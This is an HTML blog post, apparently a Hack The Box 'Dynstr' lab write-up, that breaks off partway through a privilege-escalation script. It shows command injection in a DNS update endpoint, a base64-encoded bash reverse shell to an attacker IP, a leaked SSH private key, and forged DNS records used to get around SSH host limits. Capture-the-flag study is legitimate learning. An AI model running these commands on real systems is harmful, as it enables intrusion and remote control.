@@ -1,0 +1,899 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>HTB: Dynstr Writeup - Alex Loney</title>
+<meta name="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+  <meta name="author" content="Alex Loney">
+  
+  <meta property="article:author" content="Alex Loney">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Alex Loney">
+<meta property="og:title" content="HTB: Dynstr Writeup">
+<meta property="og:url" content="/blog/writeup/htb/htb-dynstr/">
+
+
+  <meta property="og:description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2021-06-17T23:36:00-07:00">
+
+
+
+
+
+
+<link rel="canonical" href="/blog/writeup/htb/htb-dynstr/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": null,
+      "url": "/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="Alex Loney Feed">
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Alex Loney
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/posts/">Posts</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/">About</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a href="/">
+        <img src="/assets/images/bio-photo.jpg" alt="Alex Loney" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a class="u-url" rel="me" href="/" itemprop="url">Alex Loney</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        <p>Software Engineer by trade and passion, everything else by curiosity</p>
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+        
+          
+            <li><a href="https://alexloney.com" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Website</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/alexloney" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+
+  <article class="page h-entry" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="HTB: Dynstr Writeup">
+    <meta itemprop="description" content="There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!">
+    <meta itemprop="datePublished" content="2021-06-17T23:36:00-07:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title p-name" itemprop="headline">
+            <a href="/blog/writeup/htb/htb-dynstr/" class="u-url" itemprop="url">HTB: Dynstr Writeup
+</a>
+          </h1>
+          
+
+  <p class="page__meta">
+    
+
+    
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          8 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content e-content" itemprop="text">
+        
+        <p>There are spoilers below for the Hack The Box box named Cap. Stop reading here if you do not want spoilers!!!</p>
+
+<hr />
+
+<p>This is by FAR the most difficult box that I’ve done on HTB (I haven’t done any hard or insane boxes, but this was harder than any other medium box I’ve done).</p>
+<h1 id="enumeration">Enumeration</h1>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-oA</span> nmap/dynstr 10.129.124.191
+Starting Nmap 7.91 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-06-12 15:12 EDT
+Nmap scan report <span class="k">for </span>10.129.124.191
+Host is up <span class="o">(</span>0.091s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+53/tcp open  domain  ISC BIND 9.16.1 <span class="o">(</span>Ubuntu Linux<span class="o">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>17.07 seconds
+</code></pre></div></div>
+
+<p>There are a couple things of interest, port 53 (typically DNS stuff) and port 80 hosting an Apache server. I’ll check out port 80 first.</p>
+
+<h2 id="port-80">Port 80</h2>
+<p>There appears to be a single webpage with nothing else of interest from <code class="language-plaintext highlighter-rouge">nikto</code> or <code class="language-plaintext highlighter-rouge">gobuster</code>. The website lists the following information</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Domains:
+    dnsalias.htb
+    dynamicdns.htb
+    no-ip.htb
+
+Login:
+    Username: dynadns
+    Password: sndanyd
+</code></pre></div></div>
+
+<p>The website also says that it uses the same API as no-ip.com and through <code class="language-plaintext highlighter-rouge">gobuster</code> I located <code class="language-plaintext highlighter-rouge">/nic/update</code>. Giving that a try, I found that we can update dynamic DNS entries with a curl command like the following</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-u</span> <span class="s1">'dynadns:sndanyd'</span> <span class="s1">'http://no-ip.htb/nic/update?hostname=test.no-ip.htb'</span>
+</code></pre></div></div>
+
+<p>And this is where I was stuck for the LONGEST time! I tried many combinations, locating the longest length of string I could send, trying different credentials, etc. I even tried many MANY fuzzing strings as input, but had little to no progress. The only thing I really noticed was that it seemed to ignore quotes (“) when executing.</p>
+
+<p>After a LONG time and a lot of googling, I learned that it’s actually executing what is being sent in as a command. For example, this successfully executes:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>curl <span class="nt">-u</span> <span class="s1">'dynadns:sndanyd'</span> <span class="s1">'http://no-ip.htb/nic/update?hostname=$(echo+"test").no-ip.htb'</span>
+</code></pre></div></div>
+
+<p>Using this RCE, we can send ourselves a reverse shell, but because we’re dealing with a URL, we need to avoid special characters, so we can do that by base64 encoding the payload (note if the base64 string contains a + character, you can double-base64 encode it or adjust spacing to avoid it).</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s1">'bash -i &amp;&gt;/dev/tcp/10.10.14.5/9000 &lt;&amp;1'</span> | <span class="nb">base64
+</span><span class="nv">YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMCA8JjE</span><span class="o">=</span>
+<span class="nv">$ </span>curl <span class="nt">-u</span> <span class="s1">'dynadns:sndanyd'</span> <span class="s1">'http://no-ip.htb/nic/update?hostname=$(echo+"YmFzaCAtaSAmPi9kZXYvdGNwLzEwLjEwLjE0LjUvOTAwMCA8JjE="|base64+-d|bash).no-ip.htb'</span>
+</code></pre></div></div>
+
+<p>And catching this with a netcat listener</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>rlwrap nc <span class="nt">-lnvp</span> 9000
+listening on <span class="o">[</span>any] 9000 ...
+connect to <span class="o">[</span>10.10.14.5] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.244] 53788
+bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>753<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
+bash: no job control <span class="k">in </span>this shell
+www-data@dynstr:/var/www/html/nic<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Success! We have a remote shell!</p>
+
+<h1 id="privesc---user">Privesc - User</h1>
+<p>Now that we’re running as the <code class="language-plaintext highlighter-rouge">www-data</code> user, we need to move to the regular user.</p>
+
+<p>Firstly, the files <code class="language-plaintext highlighter-rouge">/home/bindmgr/.ssh/id_rsa.pub</code> and <code class="language-plaintext highlighter-rouge">/home/bindmgr/.ssh/authorized_keys</code> are readable and contain the same entry, so if we can locate the value in <code class="language-plaintext highlighter-rouge">/home/bindmgr/.ssh/id_rsa</code> we should be able to login! Unfortunately, there are a few issues with this.</p>
+<ol>
+  <li>The <code class="language-plaintext highlighter-rouge">id_rsa</code> file is not readable</li>
+  <li>The <code class="language-plaintext highlighter-rouge">authorized_keys</code> lists that it will only accept connections from <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code></li>
+</ol>
+
+<p>For the first problem, searching a little bit reveals the file <code class="language-plaintext highlighter-rouge">/home/bindmgr/support-case-C62796521/strace-C62796521.txt</code> which contains an strace of some command being executed, but within the strace output we see an OpenSSH private key!</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>15123 read(5, "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1\n42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3\nHjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F\nL6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn\nUOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX\nCUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz\nuSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a\nXQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P\nZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk\n+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs\n4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq\nxTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD\nPswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k\nobFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l\nu291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS\nTbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A\nTyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE\nBNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv\nC79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX\nWv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt\nU96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ\nb6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5\nrlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG\njGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==\n-----END OPENSSH PRIVATE KEY-----\n", 4096) = 1823
+</code></pre></div></div>
+
+<p>Back on our machine, we can store this for later use</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">echo</span> <span class="s2">"-----BEGIN OPENSSH PRIVATE KEY-----</span><span class="se">\n</span><span class="s2">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn</span><span class="se">\n</span><span class="s2">NhAAAAAwEAAQAAAQEAxeKZHOy+RGhs+gnMEgsdQas7klAb37HhVANJgY7EoewTwmSCcsl1</span><span class="se">\n</span><span class="s2">42kuvUhxLultlMRCj1pnZY/1sJqTywPGalR7VXo+2l0Dwx3zx7kQFiPeQJwiOM8u/g8lV3</span><span class="se">\n</span><span class="s2">HjGnCvzI4UojALjCH3YPVuvuhF0yIPvJDessdot/D2VPJqS+TD/4NogynFeUrpIW5DSP+F</span><span class="se">\n</span><span class="s2">L6oXil+sOM5ziRJQl/gKCWWDtUHHYwcsJpXotHxr5PibU8EgaKD6/heZXsD3Gn1VysNZdn</span><span class="se">\n</span><span class="s2">UOLzjapbDdRHKRJDftvJ3ZXJYL5vtupoZuzTTD1VrOMng13Q5T90kndcpyhCQ50IW4XNbX</span><span class="se">\n</span><span class="s2">CUjxJ+1jgwAAA8g3MHb+NzB2/gAAAAdzc2gtcnNhAAABAQDF4pkc7L5EaGz6CcwSCx1Bqz</span><span class="se">\n</span><span class="s2">uSUBvfseFUA0mBjsSh7BPCZIJyyXXjaS69SHEu6W2UxEKPWmdlj/WwmpPLA8ZqVHtVej7a</span><span class="se">\n</span><span class="s2">XQPDHfPHuRAWI95AnCI4zy7+DyVXceMacK/MjhSiMAuMIfdg9W6+6EXTIg+8kN6yx2i38P</span><span class="se">\n</span><span class="s2">ZU8mpL5MP/g2iDKcV5SukhbkNI/4UvqheKX6w4znOJElCX+AoJZYO1QcdjBywmlei0fGvk</span><span class="se">\n</span><span class="s2">+JtTwSBooPr+F5lewPcafVXKw1l2dQ4vONqlsN1EcpEkN+28ndlclgvm+26mhm7NNMPVWs</span><span class="se">\n</span><span class="s2">4yeDXdDlP3SSd1ynKEJDnQhbhc1tcJSPEn7WODAAAAAwEAAQAAAQEAmg1KPaZgiUjybcVq</span><span class="se">\n</span><span class="s2">xTE52YHAoqsSyBbm4Eye0OmgUp5C07cDhvEngZ7E8D6RPoAi+wm+93Ldw8dK8e2k2QtbUD</span><span class="se">\n</span><span class="s2">PswCKnA8AdyaxruDRuPY422/2w9qD0aHzKCUV0E4VeltSVY54bn0BiIW1whda1ZSTDM31k</span><span class="se">\n</span><span class="s2">obFz6J8CZidCcUmLuOmnNwZI4A0Va0g9kO54leWkhnbZGYshBhLx1LMixw5Oc3adx3Aj2l</span><span class="se">\n</span><span class="s2">u291/oBdcnXeaqhiOo5sQ/4wM1h8NQliFRXraymkOV7qkNPPPMPknIAVMQ3KHCJBM0XqtS</span><span class="se">\n</span><span class="s2">TbCX2irUtaW+Ca6ky54TIyaWNIwZNznoMeLpINn7nUXbgQAAAIB+QqeQO7A3KHtYtTtr6A</span><span class="se">\n</span><span class="s2">Tyk6sAVDCvrVoIhwdAHMXV6cB/Rxu7mPXs8mbCIyiLYveMD3KT7ccMVWnnzMmcpo2vceuE</span><span class="se">\n</span><span class="s2">BNS+0zkLxL7+vWkdWp/A4EWQgI0gyVh5xWIS0ETBAhwz6RUW5cVkIq6huPqrLhSAkz+dMv</span><span class="se">\n</span><span class="s2">C79o7j32R2KQAAAIEA8QK44BP50YoWVVmfjvDrdxIRqbnnSNFilg30KAd1iPSaEG/XQZyX</span><span class="se">\n</span><span class="s2">Wv//+lBBeJ9YHlHLczZgfxR6mp4us5BXBUo3Q7bv/djJhcsnWnQA9y9I3V9jyHniK4KvDt</span><span class="se">\n</span><span class="s2">U96sHx5/UyZSKSPIZ8sjXtuPZUyppMJVynbN/qFWEDNAxholEAAACBANIxP6oCTAg2yYiZ</span><span class="se">\n</span><span class="s2">b6Vity5Y2kSwcNgNV/E5bVE1i48E7vzYkW7iZ8/5Xm3xyykIQVkJMef6mveI972qx3z8m5</span><span class="se">\n</span><span class="s2">rlfhko8zl6OtNtayoxUbQJvKKaTmLvfpho2PyE4E34BN+OBAIOvfRxnt2x2SjtW3ojCJoG</span><span class="se">\n</span><span class="s2">jGPLYph+aOFCJ3+TAAAADWJpbmRtZ3JAbm9tZW4BAgMEBQ==</span><span class="se">\n</span><span class="s2">-----END OPENSSH PRIVATE KEY-----</span><span class="se">\n</span><span class="s2">"</span> <span class="o">&gt;</span> bindmgr
+<span class="nv">$ </span><span class="nb">chmod </span>700 bindmgr
+</code></pre></div></div>
+
+<p>Now for the second problem of the hostname. We know that this server acts as a dynamic DNS server, so it updates hostnames all the time, but it only allows updating of specific addresses, so lets check to see why this is?</p>
+
+<p>Taking a look at the <code class="language-plaintext highlighter-rouge">/var/www/html/nic/update</code> file, we see that it’s a PHP file:</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+  <span class="c1">// Check authentication</span>
+  <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_USER'</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_PW'</span><span class="p">]))</span>      <span class="p">{</span> <span class="k">echo</span> <span class="s2">"badauth</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_USER'</span><span class="p">]</span><span class="mf">.</span><span class="s2">":"</span><span class="mf">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'PHP_AUTH_PW'</span><span class="p">]</span><span class="o">!==</span><span class="s1">'dynadns:sndanyd'</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"badauth</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+
+  <span class="c1">// Set $myip from GET, defaulting to REMOTE_ADDR</span>
+  <span class="nv">$myip</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'REMOTE_ADDR'</span><span class="p">];</span>
+  <span class="k">if</span> <span class="p">(</span><span class="nv">$valid</span><span class="o">=</span><span class="nb">filter_var</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'myip'</span><span class="p">],</span><span class="no">FILTER_VALIDATE_IP</span><span class="p">))</span>                       <span class="p">{</span> <span class="nv">$myip</span> <span class="o">=</span> <span class="nv">$valid</span><span class="p">;</span> <span class="p">}</span>
+
+  <span class="k">if</span><span class="p">(</span><span class="k">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hostname'</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="c1">// Check for a valid domain</span>
+    <span class="k">list</span><span class="p">(</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">)</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'hostname'</span><span class="p">],</span><span class="mi">2</span><span class="p">);</span>
+    <span class="nv">$validds</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s1">'dnsalias.htb'</span><span class="p">,</span><span class="s1">'dynamicdns.htb'</span><span class="p">,</span><span class="s1">'no-ip.htb'</span><span class="p">);</span>
+    <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$validds</span><span class="p">))</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"911 [wrngdom: </span><span class="nv">$d</span><span class="s2">]</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span> <span class="p">}</span>
+    <span class="c1">// Update DNS entry</span>
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nb">sprintf</span><span class="p">(</span><span class="s2">"server 127.0.0.1</span><span class="se">\n</span><span class="s2">zone %s</span><span class="se">\n</span><span class="s2">update delete %s.%s</span><span class="se">\n</span><span class="s2">update add %s.%s 30 IN A %s</span><span class="se">\n</span><span class="s2">send</span><span class="se">\n</span><span class="s2">"</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$h</span><span class="p">,</span><span class="nv">$d</span><span class="p">,</span><span class="nv">$myip</span><span class="p">);</span>
+    <span class="nb">system</span><span class="p">(</span><span class="s1">'echo "'</span><span class="mf">.</span><span class="nv">$cmd</span><span class="mf">.</span><span class="s1">'" | /usr/bin/nsupdate -t 1 -k /etc/bind/ddns.key'</span><span class="p">,</span><span class="nv">$retval</span><span class="p">);</span>
+    <span class="c1">// Return good or 911</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$retval</span><span class="p">)</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"good </span><span class="nv">$myip</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+      <span class="k">echo</span> <span class="s2">"911 [nsupdate failed]</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+  <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="k">echo</span> <span class="s2">"nochg </span><span class="nv">$myip</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+  <span class="p">}</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>Furthermore, it looks like the hostname restriction is just performed in this PHP file, so if we can bypass the file and directly execute the <code class="language-plaintext highlighter-rouge">nsupdate</code> command, maybe we can get ourself assigned to a correct domain that is allowed logging in.</p>
+
+<p>It looks like there’s a key file referenced in the PHP script called <code class="language-plaintext highlighter-rouge">/etc/bind/ddns.key</code>, so taking a look at the <code class="language-plaintext highlighter-rouge">/etc/bind</code> directory, there are a few other interesting files:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">ls</span> /etc/bind
+...
+ddns.key
+infra.key
+rndc.key
+...
+</code></pre></div></div>
+
+<p>Since we want a <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code> domain, I bet that <code class="language-plaintext highlighter-rouge">infra.key</code> file is what we will need to use.</p>
+
+<p>After a bit more googling, I determined that what we need to do is update and create an A record, then assign our ip as a PTR to that record.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nsupdate <span class="nt">-k</span> /etc/bind/infra.key
+update add api.infra.dyna.htb 86400 A 10.10.14.5
+
+update add 5.14.10.10.in-addr.arpa 86400 PTR api.infra.dyna.htb
+show
+Outgoing update query:
+<span class="p">;;</span> -&gt;&gt;HEADER<span class="o">&lt;&lt;-</span> <span class="no">opcode</span><span class="sh">: UPDATE, status: NOERROR, id:      0
+;; flags:; ZONE: 0, PREREQ: 0, UPDATE: 0, ADDITIONAL: 0
+;; UPDATE SECTION:
+5.14.10.10.in-addr.arpa. 86400  IN      PTR     api.infra.dyna.htb.
+
+send
+quit
+</span></code></pre></div></div>
+
+<p>Now, back on our machine, we can attempt to log in</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh <span class="nt">-i</span> bindmgr bindmgr@no-ip.htb
+bindmgr@dynstr:/tmp/test<span class="err">$</span>
+</code></pre></div></div>
+
+<p>Success! We now have user!!</p>
+
+<h1 id="privesc---root">Privesc - Root</h1>
+<p>Looking around as the <code class="language-plaintext highlighter-rouge">bindmgr</code> user, I noticed that we can execute a command with sudo</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span>: unable to resolve host dynstr.dyna.htb: Name or service not known
+Matching Defaults entries <span class="k">for </span>bindmgr on dynstr:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User bindmgr may run the following commands on dynstr:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/local/bin/bindmgr.sh
+</code></pre></div></div>
+
+<p>So, this <code class="language-plaintext highlighter-rouge">/usr/local/bin/bindmgr.sh</code> scrip can be executed, looking at the contents we have:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/bash</span>
+
+<span class="c"># This script generates named.conf.bindmgr to workaround the problem</span>
+<span class="c"># that bind/named can only include single files but no directories.</span>
+<span class="c">#</span>
+<span class="c"># It creates a named.conf.bindmgr file in /etc/bind that can be included</span>
+<span class="c"># from named.conf.local (or others) and will include all files from the</span>
+<span class="c"># directory /etc/bin/named.bindmgr.</span>
+<span class="c">#</span>
+<span class="c"># NOTE: The script is work in progress. For now bind is not including</span>
+<span class="c">#       named.conf.bindmgr. </span>
+<span class="c">#</span>
+<span class="c"># TODO: Currently the script is only adding files to the directory but</span>
+<span class="c">#       not deleting them. As we generate the list of files to be included</span>
+<span class="c">#       from the source directory they won't be included anyway.</span>
+
+<span class="nv">BINDMGR_CONF</span><span class="o">=</span>/etc/bind/named.conf.bindmgr
+<span class="nv">BINDMGR_DIR</span><span class="o">=</span>/etc/bind/named.bindmgr
+
+indent<span class="o">()</span> <span class="o">{</span> <span class="nb">sed</span> <span class="s1">'s/^/    /'</span><span class="p">;</span> <span class="o">}</span>
+
+<span class="c"># Check versioning (.version)</span>
